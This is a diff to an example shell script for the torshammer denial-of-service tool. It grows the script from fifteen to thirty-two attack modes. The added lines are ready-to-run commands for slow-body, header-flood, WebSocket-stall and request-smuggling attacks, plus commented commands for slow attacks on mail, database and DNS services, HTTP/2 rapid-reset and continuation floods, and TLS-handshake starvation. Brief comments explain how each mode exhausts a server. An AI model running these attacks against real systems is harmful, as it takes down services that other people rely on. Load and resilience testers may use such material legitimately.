@@ -2,7 +2,7 @@
 # Example: Testing every attack mode
 # ==================================
 # This script demonstrates how to test a target using each of the
-# fifteen available attack modes to identify which is most effective.
+# thirty-two available attack modes to identify which is most effective.
 
 TARGET_URL="${1:-http://localhost:8080}"
 
@@ -82,10 +82,58 @@ echo "12. Testing jsonrpc-slow mode..."
 torshammer -u "$TARGET_URL" -m jsonrpc-slow -c 128 -d 30
 echo ""
 
-# Modes 13-15 need a target that speaks the protocol, so they are opt-in:
-#   torshammer -u http://mail.example.com:25 -m smtp-slow-envelope -c 64 -d 30
-#   torshammer -u http://ftp.example.com:21  -m ftp-slow-command  -c 64 -d 30
-#   torshammer -u udp://dns.example.com:53   -m udp              -c 100 -d 30
+# Mode 13: slow-xml
+# Over-promises Content-Length and streams an unclosed XML/DOCTYPE document
+echo "13. Testing slow-xml mode..."
+torshammer -u "$TARGET_URL" -m slow-xml -c 128 -d 30
+echo ""
+
+# Mode 14: slow-form-parse
+# Declares a huge urlencoded body and trickles endless key=value& pairs
+echo "14. Testing slow-form-parse mode..."
+torshammer -u "$TARGET_URL" -m slow-form-parse -c 128 -d 30
+echo ""
+
+# Mode 15: header-count-flood
+# Emits ~2000 tiny headers, then completes the request (not slowloris)
+echo "15. Testing header-count-flood mode..."
+torshammer -u "$TARGET_URL" -m header-count-flood -c 128 -d 30
+echo ""
+
+# Mode 16: websocket-slow-frame
+# Completes the WebSocket upgrade, then stalls a half-received frame
+echo "16. Testing websocket-slow-frame mode..."
+torshammer -u "$TARGET_URL" -m websocket-slow-frame -c 128 -d 30
+echo ""
+
+# Mode 17: req-smuggling-probe
+# Sends an ambiguous Content-Length + Transfer-Encoding: chunked CL.TE probe
+echo "17. Testing req-smuggling-probe mode..."
+torshammer -u "$TARGET_URL" -m req-smuggling-probe -c 64 -d 30
+echo ""
+
+# Modes 18-26 need a target that speaks the protocol, so they are opt-in:
+#   torshammer -u http://mail.example.com:25   -m smtp-slow-envelope   -c 64 -d 30
+#   torshammer -u http://ftp.example.com:21    -m ftp-slow-command     -c 64 -d 30
+#   torshammer -u http://imap.example.com:143  -m imap-slow-literal    -c 64 -d 30
+#   torshammer -u http://redis.example.com:6379 -m redis-resp-slow     -c 128 -d 30
+#   torshammer -u http://db.example.com:5432   -m postgres-startup-slow -c 64 -d 30
+#   torshammer -u http://dns.example.com:53    -m dns-tcp-slow         -c 64 -d 30
+#   torshammer -u http://nntp.example.com:119  -m nntp-slow-post        -c 64 -d 30
+#   torshammer -u http://example.com           -m idle-hold            -c 256 -d 60
+#   torshammer -u udp://dns.example.com:53     -m udp                  -c 100 -d 30
+
+# HTTP/2 framing / HPACK-abuse modes (27-30) need a target serving HTTP/2 (h2c):
+#   torshammer -u http://example.com           -m h2-rapid-reset        -c 4   -d 60
+#   torshammer -u http://example.com           -m h2-slow-streams       -c 8   -d 60
+#   torshammer -u http://example.com           -m h2-continuation-flood -c 4   -d 60
+#   torshammer -u http://example.com           -m h2-hpack-drip         -c 64  -d 60
+
+# TLS-handshake starvation modes (31-32) send raw TLS records that over-promise a
+# handshake length and never complete it, pinning the server's reassembly buffer.
+# Point them at a TLS listener (host:port of an https:// endpoint):
+#   torshammer -u http://example.com:443       -m tls-slow-hello        -c 64  -d 60
+#   torshammer -u http://example.com:443       -m tls-renego-hold       -c 64  -d 60
 
 echo "All modes tested. Review the results to see which was most effective."
 
